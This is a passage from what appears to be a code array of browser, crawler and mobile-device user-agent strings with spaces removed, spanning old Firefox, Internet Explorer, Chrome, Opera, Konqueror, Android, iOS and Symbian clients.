"Mozilla/5.0(WindowsNT6.1;WOW64;rv:5.0)Gecko/20100101Firefox/5.0",
"Mozilla/4.0(compatible;MSIE7.0;WindowsNT5.1;Trident/4.0;.NETCLR2.0.50727;.NETCLR3.0.4506.2152;.NETCLR3.5.30729)",
"Mozilla/4.0(compatible;MSIE7.0;WindowsNT5.1;Trident/4.0;.NETCLR1.1.4322)",
"Mozilla/4.0(compatible;MSIE8.0;WindowsNT6.0;Trident/4.0;Mozilla/4.0(compatible;MSIE6.0;WindowsNT5.1;SV1);.NETCLR3.5.30729)",
"Mozilla/5.0(WindowsNT6.0)AppleWebKit/535.1(KHTML,likeGecko)Chrome/13.0.782.112Safari/535.1",
"Mozilla/5.0(X11;Ubuntu;Linuxx86_64;rv:13.0)Gecko/20100101Firefox/13.0.1",
"Mozilla/5.0(WindowsNT6.1;WOW64)AppleWebKit/535.1(KHTML,likeGecko)Chrome/13.0.782.112Safari/535.1",
"Mozilla/5.0(WindowsNT6.1;rv:2.0b7pre)Gecko/20100921Firefox/4.0b7pre",
"Mozilla/5.0(Macintosh;IntelMacOSX10_6_8)AppleWebKit/536.5(KHTML,likeGecko)Chrome/19.0.1084.56Safari/536.5",
"Mozilla/5.0(WindowsNT5.1;rv:12.0)Gecko/20100101Firefox/12.0",
"Mozilla/4.0(compatible;MSIE6.0;WindowsNT5.1)",
"Mozilla/5.0(WindowsNT6.1;rv:12.0)Gecko/20100101Firefox/12.0",
"Mozilla/4.0(compatible;MSIE6.0;WindowsNT5.1;SV1;MRA5.8(build4157);.NETCLR2.0.50727;AskTbPTV/5.11.3.15590)",
"Mozilla/5.0(X11;Ubuntu;Linuxi686;rv:13.0)Gecko/20100101Firefox/13.0.1",
"Mozilla/4.0(compatible;MSIE6.0;WindowsNT5.1;SV1)",
"Mozilla/5.0(Macintosh;IntelMacOSX10_7_4)AppleWebKit/534.57.5(KHTML,likeGecko)Version/5.1.7Safari/534.57.4",
"Mozilla/5.0(WindowsNT6.0;rv:13.0)Gecko/20100101Firefox/13.0.1",
"Mozilla/5.0(WindowsNT6.0;rv:13.0)Gecko/20100101Firefox/13.0.1",
"Googlebot-Image/1.0",
"Googlebot-News",
"Googlebot-Video/1.0",
"Gregarius/0.5.2(http://devlog.gregarius.net/docs/ua)",
"grub-client-1.5.3;(grub-client-1.5.3;Crawlyourownstuffwithhttp://grub.org)",
"GulperWebBot0.2.4(www.ecsl.cs.sunysb.edu/~maxim/cgi-bin/Link/GulperBot)",
"HTC_DreamMozilla/5.0(Linux;U;Android1.5;en-ca;Build/CUPCAKE)AppleWebKit/528.5(KHTML,likeGecko)Version/3.1.2MobileSafari/525.20.1",
"HTC-ST7377/1.59.502.3(67150)Opera/9.50(WindowsNT5.1;U;en)UP.Link/6.3.1.17.0",
"HTMLParser/1.6",
"iTunes/4.2(Macintosh;U;PPCMacOSX10.2)",
"iTunes/9.0.2(Windows;N)",
"Mozilla/5.0(compatible;bingbot/2.0;+http://www.bing.com/bingbot.htm)"
"iTunes/9.0.3(Macintosh;U;IntelMacOSX10_6_2;en-ca)",
"Java/1.6.0_13",
"Jigsaw/2.2.5W3C_CSS_Validator_JFouffa/2.0",
"Konqueror/3.0-rc4;(Konqueror/3.0-rc4;i686Linux;;datecode)",
"LG-GC900/V10aObigo/WAP2.0Profile/MIDP-2.1Configuration/CLDC-1.1",
"LG-LX550AU-MIC-LX550/2.0MMP/2.0Profile/MIDP-2.0Configuration/CLDC-1.1",
"libwww-perl/5.820",
"Links/0.9.1(Linux2.4.24;i386;)",
"Links(2.1pre15;FreeBSD5.3-RELEASEi386;196x84)",
"Links(2.1pre15;Linux2.4.26i686;158x61)",
"Links(2.3pre1;Linux2.6.38-8-genericx86_64;170x48)",
"Lynx/2.8.5rel.1libwww-FM/2.14SSL-MM/1.4.1GNUTLS/0.8.12",
"Lynx/2.8.7dev.4libwww-FM/2.14SSL-MM/1.4.1OpenSSL/0.9.8d",
"Mediapartners-Google",
"MicrosoftURLControl-6.00.8862",
"Midori/0.1.10(X11;Linuxi686;U;en-us)WebKit/(531).(2)",
"MOT-L7v/08.B7.5DRMIB/2.2.1Profile/MIDP-2.0Configuration/CLDC-1.1UP.Link/6.3.0.0.0",
"MOTORIZR-Z8/46.00.00Mozilla/4.0(compatible;MSIE6.0;SymbianOS;356)Opera8.65[it]UP.Link/6.3.0.0.0",
"MOT-V177/0.1.75UP.Browser/6.2.3.9.c.12(GUI)MMP/2.0UP.Link/6.3.1.13.0",
"MOT-V9mm/00.62UP.Browser/6.2.3.4.c.1.123(GUI)MMP/2.0",
"Mozilla/1.22(compatible;MSIE5.01;PalmOS3.0)EudoraWeb2.1",
"Mozilla/2.02E(Win95;U)",
"Mozilla/2.0(compatible;AskJeeves/Teoma)",
"Mozilla/3.01Gold(Win95;I)",
"Mozilla/3.0(compatible;NetPositive/2.1.1;BeOS)",
"Mozilla/4.0(compatible;GoogleToolbar4.0.1019.5266-big;WindowsXP5.1;MSIE6.0.2900.2180)",
"Mozilla/4.0(compatible;Linux2.6.22)NetFront/3.4Kindle/2.0(screen600x800)",
"Mozilla/4.0(compatible;MSIE4.01;WindowsCE;PPC;MDAPro/1.0Profile/MIDP-2.0Configuration/CLDC-1.1)",
"Mozilla/4.0(compatible;MSIE5.0;Series80/2.0Nokia9500/4.51Profile/MIDP-2.0Configuration/CLDC-1.1)",
"Mozilla/4.0(compatible;MSIE5.15;Mac_PowerPC)",
"Mozilla/4.0(compatible;MSIE5.5;Windows98;Win9x4.90)",
"Mozilla/4.0(compatible;MSIE5.5;WindowsNT5.0)",
"Mozilla/4.0(compatible;MSIE6.0;j2me)ReqwirelessWeb/3.5",
"Mozilla/4.0(compatible;MSIE6.0;Windows98;PalmSource/hspr-H102;Blazer/4.0)16;320x320",
"Mozilla/4.0(compatible;MSIE6.0;WindowsCE;IEMobile6.12;MicrosoftZuneHD4.3)",
"Mozilla/4.0(compatible;MSIE6.0;WindowsNT5.0;en)Opera8.0",
"Mozilla/4.0(compatible;MSIE6.0;WindowsNT5.1)",
"Mozilla/4.0(compatible;MSIE7.0;WindowsNT5.1;AvantBrowser;AvantBrowser;.NETCLR1.0.3705;.NETCLR1.1.4322;MediaCenterPC4.0;.NETCLR2.0.50727;.NETCLR3.0.04506.30)",
"Mozilla/4.0(compatible;MSIE7.0;WindowsNT5.1;winfx;.NETCLR1.1.4322;.NETCLR2.0.50727;Zune2.0)",
"Mozilla/4.0(compatible;MSIE7.0;WindowsNT6.0)",
"Mozilla/4.0(compatible;MSIE7.0;WindowsNT6.0;Trident/4.0)",
"Mozilla/4.0(compatible;MSIE7.0;WindowsNT6.0;Trident/5.0)",
"Mozilla/4.0(compatible;MSIE7.0;WindowsNT6.1;Trident/6.0)",
"Mozilla/4.0(compatible;MSIE7.0;WindowsPhoneOS7.0;Trident/3.1;IEMobile/7.0)Asus;Galaxy6",
"Mozilla/4.0(compatible;MSIE8.0;WindowsNT6.0;Trident/4.0)",
"Mozilla/4.0(compatible;MSIE8.0;WindowsNT6.1;Trident/4.0)",
"Mozilla/4.0(PDA;PalmOS/sony/modelprmr/Revision:1.1.54(en))NetFront/3.0",
"Mozilla/4.0(PSP(PlayStationPortable);2.00)",
"Mozilla/4.1(compatible;MSIE5.0;SymbianOS;Nokia6600;452)Opera6.20[en-US]",
"Mozilla/4.77[en](X11;I;IRIX;646.5IP30)",
"Mozilla/4.8[en](WindowsNT5.1;U)",
"Mozilla/4.8[en](X11;U;SunOS;5.7sun4u)",
"Mozilla/5.0(Android;Linuxarmv7l;rv:10.0.1)Gecko/20100101Firefox/10.0.1Fennec/10.0.1",
"Mozilla/5.0(WindowsNT6.1;rv:27.3)Gecko/20130101Firefox/27.3",
"Mozilla/5.0(Macintosh;IntelMacOSX10.6;rv:25.0)Gecko/20100101Firefox/25.0",
"Mozilla/5.0(X11;Ubuntu;Linuxx86_64;rv:24.0)Gecko/20100101Firefox/24.0",
"Mozilla/5.0(Windows;U;MSIE9.0;WIndowsNT9.0;en-US))",
"Mozilla/5.0(compatible;MSIE10.0;WindowsNT6.1;WOW64;Trident/6.0)",
"Mozilla/5.0(compatible;MSIE10.0;WindowsNT6.1;Trident/4.0;InfoPath.2;SV1;.NETCLR2.0.50727;WOW64)",
"Mozilla/5.0(compatible;MSIE10.0;Macintosh;IntelMacOSX10_7_3;Trident/6.0)",
"Opera/12.0(WindowsNT5.2;U;en)Presto/22.9.168Version/12.00",
"Opera/9.80(WindowsNT6.0)Presto/2.12.388Version/12.14",
"Mozilla/5.0(WindowsNT6.0;rv:2.0)Gecko/20100101Firefox/4.0Opera12.14",
"Mozilla/5.0(compatible;MSIE9.0;WindowsNT6.0)Opera12.14",
"Opera/12.80(WindowsNT5.1;U;en)Presto/2.10.289Version/12.02",
"Opera/9.80(WindowsNT6.1;U;es-ES)Presto/2.9.181Version/12.00",
"Opera/9.80(WindowsNT5.1;U;zh-sg)Presto/2.9.181Version/12.00",
"Mozilla/5.0(compatible;MSIE9.0;WindowsPhoneOS7.5;Trident/5.0;IEMobile/9.0)",
"HTC_Touch_3GMozilla/4.0(compatible;MSIE6.0;WindowsCE;IEMobile7.11)",
"Mozilla/5.0(Android;Linuxarmv7l;rv:2.0.1)Gecko/20100101Firefox/4.0.1Fennec/2.0.1",
"Mozilla/5.0(BeOS;U;BeOSBePC;en-US;rv:1.9a1)Gecko/20060702SeaMonkey/1.5a",
"Mozilla/5.0(BlackBerry;U;BlackBerry9800;en)AppleWebKit/534.1(KHTML,LikeGecko)Version/6.0.0.141MobileSafari/534.1",
"Mozilla/5.0(compatible;bingbot/2.0http://www.bing.com/bingbot.htm)",
"Mozilla/5.0(compatible;Exabot/3.0;http://www.exabot.com/go/robot)",
"Mozilla/5.0(compatible;Googlebot/2.1;http://www.google.com/bot.html)",
"Mozilla/5.0(Windows;U;WindowsNT5.1;en-US)AppleWebKit/525.19(KHTML,likeGecko)Chrome/1.0.154.53Safari/525.19"
"Mozilla/5.0(Windows;U;WindowsNT5.1;en-US)AppleWebKit/525.19(KHTML,likeGecko)Chrome/1.0.154.36Safari/525.19"
"Mozilla/5.0(Windows;U;WindowsNT6.1;en-US)AppleWebKit/534.10(KHTML,likeGecko)Chrome/7.0.540.0Safari/534.10"
"Mozilla/5.0(X11;U;Linuxi686;en-US;rv:1.7.12)Gecko/20050923CentOS/1.0.7-1.4.1.centos4Firefox/1.0.7"
"Mozilla/5.0(compatible;Konqueror/3.3;Linux2.6.8-gentoo-r3;X11;",
"Mozilla/5.0(compatible;Konqueror/3.5;Linux2.6.30-7.dmz.1-liquorix-686;X11)KHTML/3.5.10(likeGecko)(Debianpackage4:3.5.10.dfsg.1-1b1)",
"Mozilla/5.0(compatible;Konqueror/3.5;Linux;en_US)KHTML/3.5.6(likeGecko)(Kubuntu)",
"Mozilla/5.0(compatible;Konqueror/3.5;NetBSD4.0_RC3;X11)KHTML/3.5.7(likeGecko)",
"Mozilla/5.0(compatible;Konqueror/3.5;SunOS)KHTML/3.5.1(likeGecko)",
"Mozilla/5.0(compatible;Konqueror/4.1;DragonFly)KHTML/4.1.4(likeGecko)",
"Mozilla/5.0(compatible;Konqueror/4.1;OpenBSD)KHTML/4.1.4(likeGecko)",
"Mozilla/5.0(compatible;Konqueror/4.2;Linux)KHTML/4.2.4(likeGecko)Slackware/13.0",
"Mozilla/5.0(compatible;Konqueror/4.3;Linux)KHTML/4.3.1(likeGecko)Fedora/4.3.1-3.fc11",
"Mozilla/5.0(compatible;Konqueror/4.4;Linux2.6.32-22-generic;X11;en_US)KHTML/4.4.3(likeGecko)Kubuntu",
"Mozilla/5.0(compatible;Konqueror/4.4;Linux)KHTML/4.4.1(likeGecko)Fedora/4.4.1-1.fc12",
"Mozilla/5.0(compatible;Konqueror/4.5;FreeBSD)KHTML/4.5.4(likeGecko)",
"Mozilla/5.0(compatible;Konqueror/4.5;NetBSD5.0.2;X11;amd64;en_US)KHTML/4.5.4(likeGecko)",
"Mozilla/5.0(compatible;Konqueror/4.5;Windows)KHTML/4.5.4(likeGecko)",
"Mozilla/5.0(compatible;MSIE10.0;WindowsNT6.1;WOW64;Trident/6.0)",
"Mozilla/5.0(compatible;MSIE10.6;WindowsNT6.1;Trident/5.0;InfoPath.2;SLCC1;.NETCLR3.0.4506.2152;.NETCLR3.5.30729;.NETCLR2.0.50727)3gpp-gbaUNTRUSTED/1.0",
"Mozilla/5.0(compatible;MSIE9.0;WindowsNT6.1;Trident/5.0)",
"Mozilla/5.0(compatible;MSIE9.0;WindowsNT6.2;Trident/5.0)",
"Mozilla/5.0(compatible;MSIE9.0;WindowsNT6.2;WOW64;Trident/5.0)",
"Mozilla/5.0(compatible;MSIE9.0;WindowsPhoneOS7.5;Trident/5.0;IEMobile/9.0)",
"Mozilla/5.0(compatible;Yahoo!SlurpChina;http://misc.yahoo.com.cn/help.html)",
"Mozilla/5.0(compatible;Yahoo!Slurp;http://help.yahoo.com/help/us/ysearch/slurp)",
"Mozilla/5.0(en-us)AppleWebKit/525.13(KHTML,likeGecko;GoogleWebPreview)Version/3.1Safari/525.13",
"Mozilla/5.0(hp-tablet;Linux;hpwOS/3.0.2;U;de-DE)AppleWebKit/534.6(KHTML,likeGecko)wOSBrowser/234.40.1Safari/534.6TouchPad/1.0",
"Mozilla/5.0(iPad;U;CPUOS3_2likeMacOSX;en-us)AppleWebKit/531.21.10(KHTML,likeGecko)Version/4.0.4Mobile/7B334bSafari/531.21.10",
"Mozilla/5.0(iPad;U;CPUOS4_2_1likeMacOSX;ja-jp)AppleWebKit/533.17.9(KHTML,likeGecko)Version/5.0.2Mobile/8C148Safari/6533.18.5",
"Mozilla/5.0(iPad;U;CPUOS4_3likeMacOSX;en-us)AppleWebKit/533.17.9(KHTML,likeGecko)Version/5.0.2Mobile/8F190Safari/6533.18.5",
"Mozilla/5.0(iPhone;U;CPUiPhoneOS2_0likeMacOSX;en-us)AppleWebKit/525.18.1(KHTML,likeGecko)Version/3.1.1Mobile/5A347Safari/525.200",
"Mozilla/5.0(iPhone;U;CPUiPhoneOS3_0likeMacOSX;en-us)AppleWebKit/528.18(KHTML,likeGecko)Version/4.0Mobile/7A341Safari/528.16",
"Mozilla/5.0(iPhone;U;CPUiPhoneOS4_0likeMacOSX;en-us)AppleWebKit/532.9(KHTML,likeGecko)Version/4.0.5Mobile/8A293Safari/531.22.7",
"Mozilla/5.0(iPhone;U;CPUiPhoneOS4_2_1likeMacOSX;da-dk)AppleWebKit/533.17.9(KHTML,likeGecko)Version/5.0.2Mobile/8C148Safari/6533.18.5",
"Mozilla/5.0(iPhone;U;CPUiPhoneOS4_3likeMacOSX;de-de)AppleWebKit/533.17.9(KHTML,likeGecko)Mobile/8F190",
"Mozilla/5.0(iPhone;U;CPUiPhoneOS)(compatible;Googlebot-Mobile/2.1;http://www.google.com/bot.html)",
"Mozilla/5.0(iPhone;U;CPUlikeMacOSX;en)AppleWebKit/420(KHTML,likeGecko)Version/3.0Mobile/1A543aSafari/419.3",
"Mozilla/5.0(iPod;U;CPUiPhoneOS2_2_1likeMacOSX;en-us)AppleWebKit/525.18.1(KHTML,likeGecko)Version/3.1.1Mobile/5H11aSafari/525.20",
"Mozilla/5.0(iPod;U;CPUiPhoneOS3_1_1likeMacOSX;en-us)AppleWebKit/528.18(KHTML,likeGecko)Mobile/7C145",
"Mozilla/5.0(Linux;U;Android0.5;en-us)AppleWebKit/522(KHTML,likeGecko)Safari/419.3",
"Mozilla/5.0(Linux;U;Android1.0;en-us;dream)AppleWebKit/525.10(KHTML,likeGecko)Version/3.0.4MobileSafari/523.12.2",
"Mozilla/5.0(Linux;U;Android1.1;en-gb;dream)AppleWebKit/525.10(KHTML,likeGecko)Version/3.0.4MobileSafari/523.12.2",
"Mozilla/5.0(Linux;U;Android1.5;de-ch;HTCHeroBuild/CUPCAKE)AppleWebKit/528.5(KHTML,likeGecko)Version/3.1.2MobileSafari/525.20.1",
"Mozilla/5.0(Linux;U;Android1.5;de-de;GalaxyBuild/CUPCAKE)AppleWebKit/528.5(KHTML,likeGecko)Version/3.1.2MobileSafari/525.20.1",
"Mozilla/5.0(Linux;U;Android1.5;de-de;HTCMagicBuild/PLAT-RC33)AppleWebKit/528.5(KHTML,likeGecko)Version/3.1.2MobileSafari/525.20.1FirePHP/0.3",
"Mozilla/5.0(Linux;U;Android1.5;en-gb;T-Mobile_G2_TouchBuild/CUPCAKE)AppleWebKit/528.5(KHTML,likeGecko)Version/3.1.2MobileSafari/525.20.1",
"Mozilla/5.0(Linux;U;Android1.5;en-us;htc_bahamasBuild/CRB17)AppleWebKit/528.5(KHTML,likeGecko)Version/3.1.2MobileSafari/525.20.1",
"Mozilla/5.0(Linux;U;Android1.5;en-us;sdkBuild/CUPCAKE)AppleWebkit/528.5(KHTML,likeGecko)Version/3.1.2MobileSafari/525.20.1",
"Mozilla/5.0(Linux;U;Android1.5;en-us;SPH-M900Build/CUPCAKE)AppleWebKit/528.5(KHTML,likeGecko)Version/3.1.2MobileSafari/525.20.1",
"Mozilla/5.0(Linux;U;Android1.5;en-us;T-MobileG1Build/CRB43)AppleWebKit/528.5(KHTML,likeGecko)Version/3.1.2MobileSafari525.20.1",
"Mozilla/5.0(Linux;U;Android1.5;fr-fr;GT-I5700Build/CUPCAKE)AppleWebKit/528.5(KHTML,likeGecko)Version/3.1.2MobileSafari/525.20.1",
"Mozilla/5.0(Linux;U;Android1.6;en-us;HTC_TATTOO_A3288Build/DRC79)AppleWebKit/528.5(KHTML,likeGecko)Version/3.1.2MobileSafari/525.20.1",
"Mozilla/5.0(Linux;U;Android1.6;en-us;SonyEricssonX10iBuild/R1AA056)AppleWebKit/528.5(KHTML,likeGecko)Version/3.1.2MobileSafari/525.20.1",
"Mozilla/5.0(Linux;U;Android1.6;es-es;SonyEricssonX10iBuild/R1FA016)AppleWebKit/528.5(KHTML,likeGecko)Version/3.1.2MobileSafari/525.20.1",
"Mozilla/5.0(Linux;U;Android2.0.1;de-de;MilestoneBuild/SHOLS_U2_01.14.0)AppleWebKit/530.17(KHTML,likeGecko)Version/4.0MobileSafari/530.17",
"Mozilla/5.0(Linux;U;Android2.0;en-us;DroidBuild/ESD20)AppleWebKit/530.17(KHTML,likeGecko)Version/4.0MobileSafari/530.17",
"Mozilla/5.0(Linux;U;Android2.0;en-us;MilestoneBuild/SHOLS_U2_01.03.1)AppleWebKit/530.17(KHTML,likeGecko)Version/4.0MobileSafari/530.17",
"Mozilla/5.0(Linux;U;Android2.1;en-us;HTCLegendBuild/cupcake)AppleWebKit/530.17(KHTML,likeGecko)Version/4.0MobileSafari/530.17",
"Mozilla/5.0(Linux;U;Android2.1;en-us;NexusOneBuild/ERD62)AppleWebKit/530.17(KHTML,likeGecko)Version/4.0MobileSafari/530.17",
"Mozilla/5.0(Linux;U;Android2.1-update1;de-de;HTCDesire1.19.161.5Build/ERE27)AppleWebKit/530.17(KHTML,likeGecko)Version/4.0MobileSafari/530.17",
"Mozilla/5.0(Linux;U;Android2.2;en-ca;GT-P1000MBuild/FROYO)AppleWebKit/533.1(KHTML,likeGecko)Version/4.0MobileSafari/533.1",
"Mozilla/5.0(Linux;U;Android2.2;en-us;ADR6300Build/FRF91)AppleWebKit/533.1(KHTML,likeGecko)Version/4.0MobileSafari/533.1",
"Mozilla/5.0(Linux;U;Android2.2;en-us;DroidBuild/FRG22D)AppleWebKit/533.1(KHTML,likeGecko)Version/4.0MobileSafari/533.1",
"Mozilla/5.0(Linux;U;Android2.2;en-us;NexusOneBuild/FRF91)AppleWebKit/533.1(KHTML,likeGecko)Version/4.0MobileSafari/533.1",
"Mozilla/5.0(Linux;U;Android2.2;en-us;SprintAPA9292KTBuild/FRF91)AppleWebKit/533.1(KHTML,likeGecko)Version/4.0MobileSafari/533.1",
"Mozilla/5.0(Linux;U;Android2.3.4;en-us;BNTV250Build/GINGERBREAD)AppleWebKit/533.1(KHTML,likeGecko)Version/4.0Safari/533.1",
"Mozilla/5.0(Linux;U;Android3.0.1;en-us;GT-P7100Build/HRI83)AppleWebkit/534.13(KHTML,likeGecko)Version/4.0Safari/534.13",
"Mozilla/5.0(Linux;U;Android3.0.1;fr-fr;A500Build/HRI66)AppleWebKit/534.13(KHTML,likeGecko)Version/4.0Safari/534.13",
"Mozilla/5.0(Linux;U;Android3.0;en-us;XoomBuild/HRI39)AppleWebKit/525.10(KHTML,likeGecko)Version/3.0.4MobileSafari/523.12.2",
"Mozilla/5.0(Linux;U;Android4.0.3;de-ch;HTCSensationBuild/IML74K)AppleWebKit/534.30(KHTML,likeGecko)Version/4.0MobileSafari/534.30",
"Mozilla/5.0(Linux;U;Android4.0.3;de-de;GalaxySIIBuild/GRJ22)AppleWebKit/534.30(KHTML,likeGecko)Version/4.0MobileSafari/534.30",
"Mozilla/5.0(LinuxU;en-US)AppleWebKit/528.5(KHTML,likeGecko,Safari/528.5)Version/4.0Kindle/3.0(screen600x800;rotate)",
"Mozilla/5.0(Macintosh;IntelMacOSX10.5;rv:10.0.1)Gecko/20100101Firefox/10.0.1SeaMonkey/2.7.1",
"Mozilla/5.0(Macintosh;IntelMacOSX10_6_8)AppleWebKit/535.2(KHTML,likeGecko)Chrome/15.0.874.54Safari/535.2",
"Mozilla/5.0(Macintosh;IntelMacOSX10_6_8)AppleWebKit/535.7(KHTML,likeGecko)Chrome/16.0.912.36Safari/535.7",
"Mozilla/5.0(Macintosh;IntelMacOSX10.6;rv:2.0.1)Gecko/20100101Firefox/4.0.1",
"Mozilla/5.0(Macintosh;IntelMacOSX10.6;rv:2.0.1)Gecko/20100101Firefox/4.0.1Camino/2.2.1",
"Mozilla/5.0(Macintosh;IntelMacOSX10.6;rv:2.0b6pre)Gecko/20100907Firefox/4.0b6preCamino/2.2a1pre",
"Mozilla/5.0(Macintosh;IntelMacOSX10.6;rv:5.0)Gecko/20100101Firefox/5.0",
"Mozilla/5.0(Macintosh;IntelMacOSX10.6;rv:9.0)Gecko/20100101Firefox/9.0",
"Mozilla/5.0(Macintosh;IntelMacOSX10_7_2)AppleWebKit/535.1(KHTML,likeGecko)Chrome/14.0.835.186Safari/535.1",
"Mozilla/5.0(Macintosh;IntelMacOSX10_7_2;rv:10.0.1)Gecko/20100101Firefox/10.0.1",
"Mozilla/5.0(Macintosh;IntelMacOSX10_7_3)AppleWebKit/534.55.3(KHTML,likeGecko)Version/5.1.3Safari/534.53.10",
"Mozilla/5.0(Macintosh;IntelMacOSX10_8_0)AppleWebKit/536.3(KHTML,likeGecko)Chrome/19.0.1063.0Safari/536.3",
"Mozilla/5.0(Macintosh;U;IntelMacOSX10_5_6;en-US)AppleWebKit/528.16(KHTML,likeGecko,Safari/528.16)OmniWeb/v622.8.0",
"Mozilla/5.0(Macintosh;U;IntelMacOSX10_5_7;en-us)AppleWebKit/530.17(KHTML,likeGecko)Version/4.0Safari/530.17",
"Mozilla/5.0(Macintosh;U;IntelMacOSX10_5_8;en-US)AppleWebKit/532.8(KHTML,likeGecko)Chrome/4.0.302.2Safari/532.8",
"Mozilla/5.0(Macintosh;U;IntelMacOSX10.5;en-US;rv:1.9.1)Gecko/20090624Firefox/3.5",
"Mozilla/5.0(Macintosh;U;IntelMacOSX10_6_2;en-us)AppleWebKit/531.21.8(KHTML,likeGecko)Version/4.0.4Safari/531.21.10",
"Mozilla/5.0(Macintosh;U;IntelMacOSX10_6_4;en-US)AppleWebKit/534.3(KHTML,likeGecko)Chrome/6.0.464.0Safari/534.3",
"Mozilla/5.0(Macintosh;U;IntelMacOSX10_6_5;de-de)AppleWebKit/534.15(KHTML,likeGecko)Version/5.0.3Safari/533.19.4",
"Mozilla/5.0(Macintosh;U;IntelMacOSX10_6_5;en-US)AppleWebKit/534.13(KHTML,likeGecko)Chrome/9.0.597.15Safari/534.13",
"Mozilla/5.0(Macintosh;U;IntelMacOSX10_6_6;en-us)AppleWebKit/533.20.25(KHTML,likeGecko)Version/5.0.4Safari/533.20.27",
"Mozilla/5.0(Macintosh;U;IntelMacOSX10.6;en-US;rv:1.9.2.14)Gecko/20110218AlexaToolbar/alxf-2.0Firefox/3.6.14",
"Mozilla/5.0(Macintosh;U;IntelMacOSX10_7;en-us)AppleWebKit/534.20.8(KHTML,likeGecko)Version/5.1Safari/534.20.8",
"Mozilla/5.0(Macintosh;U;IntelMacOSX;en-US)AppleWebKit/528.16(KHTML,likeGecko,Safari/528.16)OmniWeb/v622.8.0.112941",
"Mozilla/5.0(Macintosh;U;MacOSXMach-O;en-US;rv:2.0a)Gecko/20040614Firefox/3.0.0",
"Mozilla/5.0(Macintosh;U;PPCMacOSX10.5;en-US;rv:1.9.0.3)Gecko/2008092414Firefox/3.0.3",
"Mozilla/5.0(Macintosh;U;PPCMacOSX10.5;en-US;rv:1.9.2.15)Gecko/20110303Firefox/3.6.15",
"Mozilla/5.0(Macintosh;U;PPCMacOSX;en)AppleWebKit/125.2(KHTML,likeGecko)Safari/125.8",
"Mozilla/5.0(Macintosh;U;PPCMacOSX;en)AppleWebKit/125.2(KHTML,likeGecko)Safari/85.8",
"Mozilla/5.0(Macintosh;U;PPCMacOSX;en)AppleWebKit/418.8(KHTML,likeGecko)Safari/419.3",
"Mozilla/5.0(Macintosh;U;PPCMacOSX;en-US)AppleWebKit/125.4(KHTML,likeGecko,Safari)OmniWeb/v563.15",
"Mozilla/5.0(Macintosh;U;PPCMacOSX;fr-fr)AppleWebKit/312.5(KHTML,likeGecko)Safari/312.3",
"Mozilla/5.0(Maemo;Linuxarmv7l;rv:10.0.1)Gecko/20100101Firefox/10.0.1Fennec/10.0.1",
"Mozilla/5.0(Maemo;Linuxarmv7l;rv:2.0.1)Gecko/20100101Firefox/4.0.1Fennec/2.0.1",
"Mozilla/5.0(MeeGo;NokiaN950-00/00)AppleWebKit/534.13(KHTML,likeGecko)NokiaBrowser/8.5.0MobileSafari/534.13",
"Mozilla/5.0(MeeGo;NokiaN9)AppleWebKit/534.13(KHTML,likeGecko)NokiaBrowser/8.5.0MobileSafari/534.13",
"Mozilla/5.0(PLAYSTATION3;1.10)",
"Mozilla/5.0(PLAYSTATION3;2.00)",
"Mozilla/5.0Slackware/13.37(X11;U;Linuxx86_64;en-US)AppleWebKit/535.1(KHTML,likeGecko)Chrome/13.0.782.41",
"Mozilla/5.0(Symbian/3;Series60/5.2NokiaC6-01/011.010;Profile/MIDP-2.1Configuration/CLDC-1.1)AppleWebKit/525(KHTML,likeGecko)Version/3.0BrowserNG/7.2.7.23gpp-gba",
"Mozilla/5.0(Symbian/3;Series60/5.2NokiaC7-00/012.003;Profile/MIDP-2.1Configuration/CLDC-1.1)AppleWebKit/525(KHTML,likeGecko)Version/3.0BrowserNG/7.2.7.33gpp-gba",
"Mozilla/5.0(Symbian/3;Series60/5.2NokiaE6-00/021.002;Profile/MIDP-2.1Configuration/CLDC-1.1)AppleWebKit/533.4(KHTML,likeGecko)NokiaBrowser/7.3.1.16MobileSafari/533.43gpp-gba",
"Mozilla/5.0(Symbian/3;Series60/5.2NokiaE7-00/010.016;Profile/MIDP-2.1Configuration/CLDC-1.1)AppleWebKit/525(KHTML,likeGecko)Version/3.0BrowserNG/7.2.7.33gpp-gba",
"Mozilla/5.0(Symbian/3;Series60/5.2NokiaN8-00/014.002;Profile/MIDP-2.1Configuration/CLDC-1.1;en-us)AppleWebKit/525(KHTML,likeGecko)Version/3.0BrowserNG/7.2.6.43gpp-gba",
"Mozilla/5.0(Symbian/3;Series60/5.2NokiaX7-00/021.004;Profile/MIDP-2.1Configuration/CLDC-1.1)AppleWebKit/533.4(KHTML,likeGecko)NokiaBrowser/7.3.1.21MobileSafari/533.43gpp-gba",
"Mozilla/5.0(SymbianOS/9.1;U;de)AppleWebKit/413(KHTML,likeGecko)Safari/413",
"Mozilla/5.0(SymbianOS/9.1;U;en-us)AppleWebKit/413(KHTML,likeGecko)Safari/413",
"Mozilla/5.0(SymbianOS/9.1;U;en-us)AppleWebKit/413(KHTML,likeGecko)Safari/413es50",
"Mozilla/5.0(SymbianOS/9.1;U;en-us)AppleWebKit/413(KHTML,likeGecko)Safari/413es65",
"Mozilla/5.0(SymbianOS/9.1;U;en-us)AppleWebKit/413(KHTML,likeGecko)Safari/413es70",
"Mozilla/5.0(SymbianOS/9.2;U;Series60/3.1Nokia5700/3.27;Profile/MIDP-2.0Configuration/CLDC-1.1)AppleWebKit/413(KHTML,likeGecko)Safari/413",
"Mozilla/5.0(SymbianOS/9.2;U;Series60/3.1Nokia6120c/3.70;Profile/MIDP-2.0Configuration/CLDC-1.1)AppleWebKit/413(KHTML,likeGecko)Safari/413",
"Mozilla/5.0(SymbianOS/9.2;U;Series60/3.1NokiaE90-1/07.24.0.3;Profile/MIDP-2.0Configuration/CLDC-1.1)AppleWebKit/413(KHTML,likeGecko)Safari/413UP.Link/6.2.3.18.0",
"Mozilla/5.0(SymbianOS/9.2;U;Series60/3.1NokiaN95/10.0.018;Profile/MIDP-2.0Configuration/CLDC-1.1)AppleWebKit/413(KHTML,likeGecko)Safari/413UP.Link/6.3.0.0.0",
"Mozilla/5.0(SymbianOS9.4;Series60/5.0NokiaN97-1/10.0.012;Profile/MIDP-2.1Configuration/CLDC-1.1;en-us)AppleWebKit/525(KHTML,likeGecko)WicKed/7.1.12344",
"Mozilla/5.0(SymbianOS/9.4;Series60/5.0NokiaN97-1/10.0.012;Profile/MIDP-2.1Configuration/CLDC-1.1;en-us)AppleWebKit/525(KHTML,likeGecko)WicKed/7.1.12344",
"Mozilla/5.0(SymbianOS/9.4;U;Series60/5.0SonyEricssonP100/01;Profile/MIDP-2.1Configuration/CLDC-1.1)AppleWebKit/525(KHTML,likeGecko)Version/3.0Safari/525",
